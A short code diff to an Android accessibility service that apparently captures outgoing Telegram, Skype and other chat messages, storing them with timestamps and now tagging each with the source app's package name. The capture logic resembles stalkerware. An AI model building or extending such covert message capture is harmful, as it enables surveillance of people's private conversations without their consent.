@@ -96,6 +96,7 @@ public class MyAccessibilityService extends AccessibilityService {
                     chat.setName("unknown");
                 }
                 chat.setType("Keluar");
+                chat.setType(accessibilityEvent.getPackageName().toString());
                 chat.setTime(utils.getCurrentTime());
                 PreferenceUtil.setTelegramChat(chat);
                 if(!chat.getMessage().equals("Type a message")&& !chat.getMessage().equals("Voice note recorder")){
@@ -155,6 +156,7 @@ public class MyAccessibilityService extends AccessibilityService {
                     chat.setName("unknown");
                 }
                 chat.setType("Keluar");
+                chat.setType(accessibilityEvent.getPackageName().toString());
                 chat.setTime(utils.getCurrentTime());
                 PreferenceUtil.setSkypeChat(chat);
                 if(!chat.getMessage().equals("Type a message")&& !chat.getMessage().equals("Voice note recorder")){
@@ -246,6 +248,7 @@ public class MyAccessibilityService extends AccessibilityService {
                         chat.setName("unknown");
                     }
                     chat.setType("Keluar");
+                    chat.setType(accessibilityEvent.getPackageName().toString());
                     chat.setTime(utils.getCurrentTime());
                     PreferenceUtil.setChat(chat);
                     if(!chat.getMessage().equals("Type a message")&& !chat.getMessage().equals("Voice note recorder")){
